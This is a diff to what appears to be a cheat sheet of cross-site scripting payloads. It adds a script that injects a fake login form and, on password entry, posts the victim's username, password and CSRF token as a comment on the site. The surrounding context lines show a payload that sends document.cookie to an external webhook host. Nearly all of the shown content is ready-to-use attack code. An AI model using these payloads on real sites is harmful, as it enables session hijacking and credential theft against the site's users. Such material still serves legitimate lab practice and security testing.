@@ -295,6 +295,36 @@ fetch('https://your-webhook-url.oastify.com', {
 ```javascript
 <script>document.location='https://your-webhook-url.oastify.com//'+document.cookie</script>
 ```
+```javascript
+<input type="text" name="username" placeholder="Enter Username">
+<input type="password" name="password" placeholder="Enter Password" onchange="hax()">
+<input type="hidden" name="csrf" value="">
+
+<script>
+  function hax() {
+    // Extract CSRF token, username, and password
+    var token = document.getElementsByName('csrf')[0].value;
+    var username = document.getElementsByName('username')[0].value;
+    var password = document.getElementsByName('password')[0].value;
+
+    // Create a FormData object
+    var data = new FormData();
+    data.append('csrf', token);
+    data.append('postId', 8);
+    data.append('comment', `${username}:${password}`);
+    data.append('name', 'victim');
+    data.append('email', 'zenshell@zenshell.ninja');
+    data.append('website', 'http://www.zenshell.ninja');
+
+    // Send the data using fetch
+    fetch('/post/comment', {
+      method: 'POST',
+      mode: 'no-cors',
+      body: data
+    });
+  }
+</script>
+```
 
 ---
 
